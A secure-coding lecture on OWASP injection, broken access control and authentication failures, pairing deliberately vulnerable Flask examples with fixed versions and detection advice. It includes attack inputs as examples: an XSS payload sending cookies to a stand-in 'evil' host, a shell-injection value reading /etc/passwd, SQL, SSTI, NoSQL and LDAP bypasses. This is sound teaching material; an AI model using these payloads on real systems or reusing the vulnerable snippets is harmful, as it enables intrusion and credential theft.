# Lecture 1 — Injection, Broken Access Control, and Authentication Failures

> *Three categories. Two-thirds of the bugs a working application-security engineer sees in a year. Injection is the oldest and best-understood; broken access control is the most-shipped because it is structural; authentication failures are the loudest when they go wrong because the front page of a credentials leak is a recruitment poster for opportunists.*

```
┌─────────────────────────────────────────────────────────────────────┐
│  AUTHORIZED USE ONLY                                                │
│                                                                     │
│  The vulnerable code in this lecture is for the lab app and your    │
│  own machine only. Do not deploy any of these snippets to a public  │
│  service. Do not run any of the attack payloads against a service   │
│  you do not operate.                                                │
└─────────────────────────────────────────────────────────────────────┘
```

This lecture covers three of the ten OWASP Top 10 2021 categories:

- **`A03:2021 Injection`** (was `A01:2017`, demoted because parameterised queries are widespread; still present because not universal).
- **`A01:2021 Broken Access Control`** (was `A05:2017`, promoted to `#1` because incidence is high, severity is high, and detection is low — the worst combination).
- **`A07:2021 Identification and Authentication Failures`** (was `A02:2017 Broken Authentication`, renamed because *identification* and *authentication* are different concerns and both fail).

For each, the structure is the same: the OWASP definition, the CWE mappings, the Python-flavoured vulnerable example, the fix side-by-side, the defender-side detection, and the open questions for the 2025 release candidate.

---

## 1. `A03:2021 Injection`

### 1.1 What OWASP says

OWASP defines injection as: *"User-supplied data is not validated, filtered, or sanitised by the application. Hostile data is used within object-relational mapping (ORM) search parameters to extract additional, sensitive records. Hostile data is directly used or concatenated. The SQL or command contains the structure and malicious data in dynamic queries, commands, or stored procedures."* (Top 10 2021, `A03:2021` definition.)

The CWE families covered:

- **CWE-89** SQL Injection
- **CWE-78** OS Command Injection
- **CWE-79** Cross-Site Scripting (yes, OWASP folded XSS into Injection in 2021 — see §1.5 below)
- **CWE-94** Code Injection
- **CWE-77** Command Injection (general)
- **CWE-90** LDAP Injection
- **CWE-917** Expression Language Injection (template-engine SSTI)

The MITRE ATT&CK technique most often mapped: `T1190 Exploit Public-Facing Application`.

### 1.2 SQL injection — the textbook case

The textbook case is also the case still shipped, weekly, by junior developers under deadline. Here is what it looks like in Flask + sqlite3:

**Vulnerable (`sqli_bad.py`):**

```python
import sqlite3
from flask import Flask, request

app = Flask(__name__)

@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]
    conn = sqlite3.connect("users.db")
    cur = conn.cursor()
    # String concatenation: the entire vulnerability lives on the next line.
    query = f"SELECT id FROM users WHERE username = '{username}' AND password = '{password}'"
    cur.execute(query)
    row = cur.fetchone()
    return ("OK" if row else "NO", 200 if row else 401)
```

Attacker submits `username=admin' --` (note the trailing space and SQL comment). The query becomes:

```sql
SELECT id FROM users WHERE username = 'admin' -- ' AND password = '<anything>'
```

— the password check is commented out; if `admin` exists, the attacker is logged in. (Aside from injection, this code also stores passwords in plaintext — that is `A02` and `A07`, addressed below.)

**Fixed (`sqli_good.py`):**

```python
import sqlite3
from flask import Flask, request
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError

app = Flask(__name__)
ph = PasswordHasher()

@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]
    conn = sqlite3.connect("users.db")
    cur = conn.cursor()
    # Parameterised: the driver binds `username` as a value, not as SQL.
    cur.execute("SELECT id, password_hash FROM users WHERE username = ?", (username,))
    row = cur.fetchone()
    if row is None:
        return ("NO", 401)
    try:
        ph.verify(row[1], password)
    except VerifyMismatchError:
        return ("NO", 401)
    return ("OK", 200)
```

Two changes. First, `cur.execute(sql, params)` with a placeholder (`?` for sqlite3; `%s` for psycopg / MySQLdb; `:name` for SQLAlchemy `text()`). The driver sends the SQL and the values as separate fields on the wire; the database never confuses them. Second, password verification uses Argon2id via `argon2-cffi` — covered in §3 of this lecture.

### 1.3 The SQLAlchemy `text()` foot-gun

ORMs reduce SQL injection by *not generating SQL from strings* — but they ship escape hatches, and the escape hatches are where injection re-enters.

**Vulnerable (`sa_text_bad.py`):**

```python
from sqlalchemy import create_engine, text

engine = create_engine("postgresql+psycopg://localhost/app")

def find_user(username: str):
    with engine.connect() as conn:
        # f-string interpolation into text(): injection survives the ORM.
        result = conn.execute(text(f"SELECT id FROM users WHERE username = '{username}'"))
        return result.fetchone()
```

**Fixed (`sa_text_good.py`):**

```python
from sqlalchemy import create_engine, text

engine = create_engine("postgresql+psycopg://localhost/app")

def find_user(username: str):
    with engine.connect() as conn:
        # Bound parameter via :name placeholder; SQLAlchemy escapes for the driver.
        result = conn.execute(
            text("SELECT id FROM users WHERE username = :u"),
            {"u": username},
        )
        return result.fetchone()
```

Or — almost always preferable — use the ORM:

```python
from sqlalchemy.orm import Session
from .models import User

def find_user(session: Session, username: str):
    return session.query(User).filter(User.username == username).one_or_none()
```

The ORM expression `User.username == username` is built up as a SQLAlchemy *expression tree*; the username is bound, not interpolated. Reach for `text()` only when you have a specific reason no `query()` shape will express.

### 1.4 OS command injection

The Python version is `os.system`, `subprocess.run(..., shell=True)`, `subprocess.call(..., shell=True)`, or `os.popen`. Anything with `shell=True` and a user-controlled argument is the vulnerability.

**Vulnerable (`cmdi_bad.py`):**

```python
import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route("/ping")
def ping():
    host = request.args.get("host", "")
    # Attacker: ?host=8.8.8.8;cat%20/etc/passwd
    out = subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True, text=True)
    return out.stdout
```

**Fixed (`cmdi_good.py`):**

```python
import ipaddress
import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route("/ping")
def ping():
    host = request.args.get("host", "")
    # Validate that `host` is, in fact, an IP address. Reject everything else.
    try:
        ipaddress.ip_address(host)
    except ValueError:
        return ("bad host", 400)
    # shell=False is the default; pass argv as a list. No shell-meta interpretation.
    out = subprocess.run(
        ["ping", "-c", "1", host],
        shell=False, capture_output=True, text=True, timeout=2,
    )
    return out.stdout
```

The two fixes are complementary: **validate** the input against a tight grammar (`ipaddress.ip_address` rejects anything that is not an IP), and **never let user input become a shell string** (`shell=False` with `argv` list). Together they close both the obvious injection and the surprise injection — the case where the validation has a flaw and the second line catches it.

If you must call a shell — pipes, expansions, etc. — quote with `shlex.quote`:

```python
import shlex
cmd = f"grep {shlex.quote(pattern)} file.txt"
```

But `shlex.quote` is a backstop, not the first defence. Prefer building an argv list.

### 1.5 XSS in the Injection category (and why)

OWASP folded XSS (CWE-79) into `A03 Injection` in 2021. The reasoning, per the 2021 introduction, is that XSS *is* injection — of attacker-controlled markup into a context (HTML, JavaScript, CSS, attribute) where it is interpreted as code by the browser. The fixes are also injection-shaped: output-encoding for the context, parameterisation of structure.

**Vulnerable (`xss_bad.py`):**

```python
from flask import Flask, request

app = Flask(__name__)

@app.route("/hello")
def hello():
    name = request.args.get("name", "")
    # f-string into HTML: classic reflected XSS.
    return f"<h1>Hello, {name}!</h1>"
```

Attacker: `?name=<script>fetch('https://evil/'+document.cookie)</script>`.

**Fixed (`xss_good.py`):**

```python
from flask import Flask, request, render_template_string
from markupsafe import escape

app = Flask(__name__)

@app.route("/hello")
def hello():
    name = request.args.get("name", "")
    # Jinja2 auto-escapes by default. Use the template engine; do not f-string HTML.
    return render_template_string("<h1>Hello, {{ name }}!</h1>", name=name)
```

Or, if you must build the string by hand: `escape(name)` from `markupsafe` (which is what Jinja2 calls under the hood).

**Defender note.** Pair every XSS fix with a Content Security Policy that constrains `script-src` to a hash, nonce, or known origin. CSP is `A05 Security Misconfiguration` territory and is covered in Lecture 2 — but the relationship is real: tight CSP means an XSS bug that slips through your output encoding still does not execute.

### 1.6 Server-side template injection (SSTI)

Jinja2 is safe **if you do not render attacker-controlled templates**. The vulnerability appears when developers pass user input as the template *source*, not as a template *variable*:

**Vulnerable (`ssti_bad.py`):**

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/preview")
def preview():
    snippet = request.args.get("snippet", "")
    # Attacker: ?snippet={{ config }}  or much worse:
    #   ?snippet={{ ''.__class__.__mro__[1].__subclasses__() }}
    return render_template_string(snippet)
```

`render_template_string(user_input)` is the foot-gun: it treats the *user input itself* as a Jinja2 template, which means the user can dereference Python objects through Jinja2's expression syntax and reach RCE.

**Fixed:**

```python
@app.route("/preview")
def preview():
    snippet = request.args.get("snippet", "")
    return render_template_string("<pre>{{ snippet }}</pre>", snippet=snippet)
```

The fix is to render a *fixed template* with the user input as a *variable*. Never render user input as a template source.

### 1.7 NoSQL, LDAP, expression-language

Brief mentions, fuller treatment in OWASP's per-category page:

- **NoSQL** (MongoDB, etc.). `db.users.find({"username": req.json["u"], "password": req.json["p"]})` is safe if the values are scalars. If `req.json["u"]` is `{"$ne": null}` (an attacker-supplied object), it short-circuits to "any user." Validate types on the way in.
- **LDAP** (CWE-90). User input concatenated into an LDAP filter (`(uid=admin)(&(password=*))`) bypasses auth. Use `ldap3`'s parameterised filter builders, or escape with `ldap3.utils.conv.escape_filter_chars`.
- **Expression-language injection** (CWE-917). Less common in pure Python; relevant when integrating with Java services that use OGNL / SpEL, or when running rules engines that take user-supplied expressions. The fix is the same: do not evaluate user-supplied expression strings.

### 1.8 Detection — what the defender sees

- **SQL syntax error spikes** in the application log are a leading indicator of probing. (Suppress the SQL from the public response *body*, but record it in the structured log.)
- **A WAF** (ModSecurity with OWASP CRS, or a cloud equivalent) catches the most common payloads. WAFs are a *defence in depth*, not a substitute for parameterisation.
- **A spike in `4xx` from a single source** is the second indicator. Rate-limit at the proxy.

The 2025 release candidate is expected to keep Injection in the top half of the list but with a sharper split between SQL/NoSQL on the one hand and OS command / SSTI on the other. The 2025 data call closed in 2024; track the OWASP project page for the final wording.

---

## 2. `A01:2021 Broken Access Control`

### 2.1 What OWASP says

*"Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorised information disclosure, modification, or destruction of all data or performing a business function outside the user's limits."* (Top 10 2021, `A01:2021`.)

OWASP promoted Broken Access Control to **`#1`** in 2021. The reasoning, in the introduction: 94% of applications tested had some form of broken access control, the average incidence rate was 3.81%, and the *severity when found* is high — these bugs leak the database row, the admin function, the other tenant.

CWE families covered:

- **CWE-285** Improper Authorisation
- **CWE-639** Authorisation Bypass Through User-Controlled Key (the IDOR family)
- **CWE-862** Missing Authorisation
- **CWE-863** Incorrect Authorisation
- **CWE-732** Incorrect Permission Assignment for Critical Resource

### 2.2 Authentication vs. authorisation — say it once, carefully

**Authentication** answers *who you are*. The session is bound to a `user_id`.
**Authorisation** answers *what you may do*. Given that you are user `42`, may you `GET /orders/17`? Is order `17` yours?

Junior developers conflate the two and ship middleware that says "is this user logged in?" without ever asking "is this user permitted to act on this resource?" The former is necessary, never sufficient.

### 2.3 IDOR — insecure direct object reference

The textbook A01 failure. The server trusts the client to send only IDs it owns.

**Vulnerable (`idor_bad.py`):**

```python
from flask import Flask, request, jsonify, abort
from flask_login import login_required, current_user
from .models import db, Order

app = Flask(__name__)

@app.route("/orders/<int:order_id>")
@login_required
def get_order(order_id):
    order = Order.query.get(order_id)
    if order is None:
        abort(404)
    return jsonify(order.to_dict())
```

`@login_required` is *authentication*. There is no *authorisation* check that the order belongs to `current_user`. User 42, logged in, requests `/orders/17` and sees user 19's order.

**Fixed (`idor_good.py`):**

```python
@app.route("/orders/<int:order_id>")
@login_required
def get_order(order_id):
    order = Order.query.get(order_id)
    if order is None:
        abort(404)
    # The authorisation check. The 404 (not 403) is deliberate:
    # do not leak the existence of orders the user does not own.
    if order.user_id != current_user.id:
        abort(404)
    return jsonify(order.to_dict())
```

Better still: scope the query to the user from the start.

```python
@app.route("/orders/<int:order_id>")
@login_required
def get_order(order_id):
    order = Order.query.filter_by(id=order_id, user_id=current_user.id).first()
    if order is None:
        abort(404)
    return jsonify(order.to_dict())
```

The second version is preferred because the authorisation check is structural — there is no path through the function that returns an order the user does not own. The first version works, but a future refactor that lifts the check (an exception handler, a "fast path") can re-introduce the bug.

### 2.4 Missing function-level authorisation

The other shape of A01: the *function* is admin-only, but the only thing stopping a non-admin from reaching it is "they don't know the URL."

**Vulnerable:**

```python
@app.route("/admin/users")
@login_required
def admin_list_users():
    return jsonify([u.to_dict() for u in User.query.all()])
```

Any logged-in user, anywhere, can hit this URL.

**Fixed:**

```python
from functools import wraps
from flask import abort

def admin_required(fn):
    @wraps(fn)
    def wrapped(*args, **kwargs):
        if not current_user.is_authenticated or not current_user.is_admin:
            abort(403)
        return fn(*args, **kwargs)
    return wrapped

@app.route("/admin/users")
@admin_required
def admin_list_users():
    return jsonify([u.to_dict() for u in User.query.all()])
```

A custom decorator (or, in Django, the `permission_required` decorator; in FastAPI, a `Depends(require_admin)` dependency) makes the authorisation visible at the route definition.

### 2.5 Deny-by-default routing

The structural answer is *deny by default*: have a route-level authorisation policy that fails closed for any route not explicitly opted into a permission class.

In FastAPI, this looks like a global dependency:

```python
from fastapi import FastAPI, Depends, HTTPException, Request

def require_authorised(request: Request):
    if not getattr(request.state, "user", None):
        raise HTTPException(401)
    return request.state.user

app = FastAPI(dependencies=[Depends(require_authorised)])

@app.get("/healthz", dependencies=[])  # explicit opt-out for public routes
async def healthz():
    return {"ok": True}
```

Every route is authorised unless it explicitly opts out — the inverse of the usual Flask pattern, and harder to ship a bug with.

### 2.6 Other A01 sub-classes

- **Forced browsing.** `/admin/`, `/.git/`, `/.env`, `/api/internal/` — URLs that exist but are not linked. The defence is server-side authorisation, not URL obscurity.
- **CORS misconfiguration.** `Access-Control-Allow-Origin: *` plus `Access-Control-Allow-Credentials: true` is a contradiction the spec forbids; some servers honour it anyway, and the result is cross-origin read of authenticated responses. Covered more in Lecture 2 (`A05`), but the impact is A01-shaped.
- **JWT `sub` confusion.** A token whose `sub` claim is trusted without re-checking the user's current state — bans, lockouts, role changes — is an authorisation control that lies. Re-check on each request, especially for high-impact actions.

### 2.7 Detection

- **Audit log** every authorisation *failure* with the user, the resource, and the action. Spikes are an attack signal.
- **Audit log** every authorisation *change* (role grant, role revoke, ownership transfer). The Repudiation case (Week 3, STRIDE R) lives here.
- **Static analysis.** `semgrep` rules in `p/owasp-top-ten` catch many missing-authorisation patterns; they are noisy on application-specific shapes but a useful first pass.

The 2025 release candidate is expected to retain Broken Access Control near the top of the list and to add explicit framing around *multi-tenancy* — row-level security, tenant-isolation guarantees — as the modern shape of A01.

---

## 3. `A07:2021 Identification and Authentication Failures`

### 3.1 What OWASP says

*"Confirmation of the user's identity, authentication, and session management is critical to protect against authentication-related attacks. There may be authentication weaknesses if the application permits credential stuffing, permits brute force or other automated attacks, permits default / weak / well-known passwords, uses weak or ineffective credential recovery, uses plain-text / encrypted / weakly-hashed passwords, has missing or ineffective multi-factor authentication, exposes session identifier in URL, reuses session identifier after successful login, or does not correctly invalidate session IDs."* (Top 10 2021, `A07:2021`, condensed.)

The 2021 rename from "Broken Authentication" (2017) is deliberate: **identification** (who is asserting an identity), **authentication** (proof of that assertion), and **session management** (carrying that proof across requests) are three different concerns, all of which can fail.

CWE families covered:

- **CWE-287** Improper Authentication
- **CWE-384** Session Fixation
- **CWE-521** Weak Password Requirements
- **CWE-307** Improper Restriction of Excessive Authentication Attempts
- **CWE-256** Plaintext Storage of a Password
- **CWE-916** Use of Password Hash with Insufficient Computational Effort

### 3.2 Password storage — Argon2id, full stop

The OWASP **Password Storage Cheat Sheet** as of 2021, reaffirmed in 2025-RC drafts, recommends in order of preference: **Argon2id** (default for new applications), **scrypt** (acceptable), **bcrypt** (acceptable, with caveats for ≥72-byte passwords), **PBKDF2-HMAC-SHA256** (acceptable when FIPS compliance forces it).

**Vulnerable (`pw_bad.py`):**

```python
import hashlib

def hash_password(password: str) -> str:
    # md5 is broken for every cryptographic purpose. Sha1 is broken. Sha256 is
    # fast — which, for password hashing, is the *bad* property.
    return hashlib.md5(password.encode()).hexdigest()
```

**Fixed (`pw_good.py`):**

```python
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError

# Default parameters target ~50ms on a modern CPU. Tune via time_cost,
# memory_cost, parallelism if you have measurement on your deployment.
ph = PasswordHasher()

def hash_password(password: str) -> str:
    return ph.hash(password)

def verify_password(stored_hash: str, password: str) -> bool:
    try:
        ph.verify(stored_hash, password)
    except VerifyMismatchError:
        return False
    return True
```

`argon2-cffi`'s `PasswordHasher` produces a self-describing hash (`$argon2id$v=19$m=65536,t=3,p=4$...`) that records the parameters; verification re-derives with the same parameters. The library also provides `ph.check_needs_rehash(stored)` so you can transparently upgrade users to stronger parameters on login.

### 3.3 Password policy — NIST SP 800-63B, not "complexity"

The current best practice, per **NIST SP 800-63B §5.1.1.2**:

- **Minimum length 8** (≥ 15 for higher-assurance applications).
- **Allow up to at least 64 characters.**
- **Allow all printable ASCII** including spaces, including emoji.
- **No composition rules** (no "must have one upper, one lower, one digit"). They make passwords worse, not better.
- **No periodic rotation**. Rotate only on suspected compromise.
- **Check against breach corpora** at registration and change. Use the *k-anonymity* API of Have I Been Pwned (HIBP) so you do not send full hashes.

The HIBP check, in Python:

```python
import hashlib
import requests

def hibp_count(password: str) -> int:
    sha1 = hashlib.sha1(password.encode()).hexdigest().upper()
    prefix, suffix = sha1[:5], sha1[5:]
    # k-anonymity: send only the 5-char prefix; HIBP returns all hashes that share it.
    r = requests.get(f"https://api.pwnedpasswords.com/range/{prefix}", timeout=3)
    r.raise_for_status()
    for line in r.text.splitlines():
        h, count = line.split(":")
        if h == suffix:
            return int(count)
    return 0

def is_breached(password: str) -> bool:
    return hibp_count(password) > 0
```

Reject any password the HIBP corpus has seen at all. (The default count threshold in many implementations is 1; some choose higher to allow rare passwords. 1 is the safer floor.)

### 3.4 Sessions — entropy, rotation, expiry

A session ID is a bearer credential. If an attacker has it, they are you. Three properties matter:

1. **Entropy.** A session ID generated from `time.time()` or `random.random()` is predictable. Use `secrets.token_urlsafe(32)` — backed by `os.urandom`, cryptographically random.
2. **Rotation on login.** Issue a new session ID at the moment of authentication. Otherwise a *session fixation* attacker — who can plant a session ID on the victim's browser before login — owns the post-login session.
3. **Server-side invalidation on logout.** A signed cookie that lives on the client is *not* invalidated by deletion. Keep a server-side record (the session row) and delete it on logout.

**Vulnerable:**

```python
import random
import time

def new_session_id() -> str:
    # time.time() is observable. random is not cryptographic.
    return f"{int(time.time())}-{random.randint(0, 10**9)}"
```

**Fixed:**

```python
import secrets

def new_session_id() -> str:
    return secrets.token_urlsafe(32)
```

For Flask, prefer **`flask-session`** with a server-side backend (Redis, the DB) over the default signed-client-cookie. For Django, the default session middleware is server-side and correct out of the box — but verify `SESSION_COOKIE_SECURE = True`, `SESSION_COOKIE_HTTPONLY = True`, `SESSION_COOKIE_SAMESITE = "Lax"` (or `"Strict"` for an admin app).

### 3.5 Rate limiting and lockout

Credential stuffing (`T1110.004`) is high-volume, low-rate per account, distributed across IP space. The defences are layered:

- **Per-account exponential back-off** on consecutive failed logins. After 5 failures, the *account* sleeps for 30 seconds; after 10, 5 minutes; after 20, an hour. Reset on successful login.
- **Per-IP rate limit** at the reverse proxy. `nginx` `limit_req`, Cloudflare rules, an `nginx-ratelimit` module. Tune for normal traffic (~1 req/s per IP for login).
- **CAPTCHA** on the third consecutive failure. Real users see it rarely; bots see it always.
- **Breach corpus block** at registration *and* on every successful login — many users were already breached when they signed up.

`flask-limiter` is the canonical Flask library:

```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(key_func=get_remote_address, default_limits=["100/minute"])
limiter.init_app(app)

@app.route("/login", methods=["POST"])
@limiter.limit("5/minute")
def login():
    ...
```

### 3.6 MFA — the second factor that matters

For any account that controls money, identity, or other accounts, **require a second factor** beyond the password. The hierarchy, strongest first:

1. **Hardware-bound WebAuthn / passkeys** (FIDO2). Phishing-resistant because the browser binds the assertion to the origin. Use `webauthn`, `fido2`, or `py-webauthn`.
2. **TOTP** (Time-based One-Time Password, RFC 6238). Phishable but cheap. `pyotp`.
3. **SMS / email codes.** The OWASP recommendation is to avoid these where possible — SIM-swap attacks and email compromise both bypass them. Acceptable as a last-resort recovery channel; not as the primary second factor.

Passkeys are the right default for any new product as of 2025. If your stack cannot ship WebAuthn yet, TOTP-via-`pyotp` is the minimum.

### 3.7 Detection

- **Authentication events** (success and failure) are the most-read logs in any incident response. Log the user (by ID, not the password), the IP, the user agent, the result, and the reason.
- **Spike in failed logins** with a flat distribution across many accounts and a flat distribution across many IPs is credential stuffing. A spike across many accounts from a *single* IP is brute force; rate-limit will catch it. The flat-flat distribution will not.
- **Impossible travel** — a successful login from Paris at 09:00 UTC and another from Tokyo at 09:05 UTC — is account takeover. Cloud identity providers (Okta, Entra) call this `T1078` Valid Accounts. If you are rolling your own auth, build the geo-distance check anyway.

The 2025 release candidate is expected to broaden A07 toward **identity** in a federated-identity sense — OAuth misconfigurations, OIDC token replay, SSO assumption sprawl — alongside the classical authentication categories. Track the OWASP page.

---

## 4. Summary

Three categories. Three CWE family groups. Three classes of fix:

| Category | Vulnerable pattern | Fix |
|---|---|---|
| `A03 Injection` | String interpolation into SQL / shell / template / HTML | Parameterise structure; bind values; escape on output |
| `A01 Broken Access Control` | `@login_required` without resource-level authorisation | Scope queries to `current_user`; deny-by-default; audit every authorisation failure |
| `A07 Identification and Authentication Failures` | `md5(password)`, predictable session IDs, no rate limit, no MFA | Argon2id; `secrets.token_urlsafe`; per-account back-off; WebAuthn / TOTP |

The next two lectures cover the rest of the Top 10: Lecture 2 takes A02, A05, A04 (cryptography, configuration, design); Lecture 3 takes A06, A09, A10, A08 (supply chain, logging, SSRF, integrity). The exercises walk you through the Python examples on your own laptop; the mini-project asks you to patch all ten in a deliberately vulnerable Flask app and to publish the patches as a portfolio artifact.

---

*Read on to [Lecture 2 — Cryptographic Failures, Misconfiguration, and Insecure Design](./02-crypto-failures-and-misconfig.md).*
